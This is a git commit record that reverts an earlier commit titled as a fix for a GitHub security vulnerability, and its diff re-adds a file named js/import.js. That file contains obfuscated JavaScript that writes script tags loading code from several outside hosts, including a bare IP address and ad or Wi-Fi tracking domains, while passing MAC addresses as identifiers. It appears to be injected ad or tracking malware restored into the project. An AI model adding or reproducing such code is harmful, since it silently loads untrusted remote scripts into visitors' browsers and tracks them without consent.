39b4527bd51432030f0b4e72006aa8529603c792
newhuan <nehwuan2017@gmail.com>
2026-03-20 17:15:45 +0800

    Revert "security: 修复 GitHub 安全漏洞"
    This reverts commit 93b46bcd3d2f04cf29899508359e0c85de2a28c0.

---
+++ js/import.js
@@ -0,0 +1,26 @@
+var __m='c8:3a:35:73:27:69';
+var __m2='00:00:00:00:00:00';
+var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=8ee9af4179981b1f95c88061fabf6478,M,";
+var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+var __n="http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m;
+var __p="http://feed.theta.sogou.com/feed_icon?pid=ikuai8_app_2&appname=ikuai&uid="+__m+"&mac="+__m2;
+var __y="http://static.helianhealth.com/hlwf/akb1.js";
+if(self==top){
+    var x=parseInt(Math.random()*(100-0+1)+0);
+    switch(true){
+        case x>=0&&x<70:
+            __w("http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m,101);
+            __w(__p,1);
+            __w(__y,5);
+            break;
+        case x>=70&&x<80:
+            __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+            __w(__y,5);
+            break;
+        case x>=80&&x<=100:
+            __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+            __w(__y,5);
+            break;
+    }
+}
+function __w(s,n){document.write("<sc"+"ript src='"+s+"'></scr"+"ipt>");document.write(__h+n+__b);}
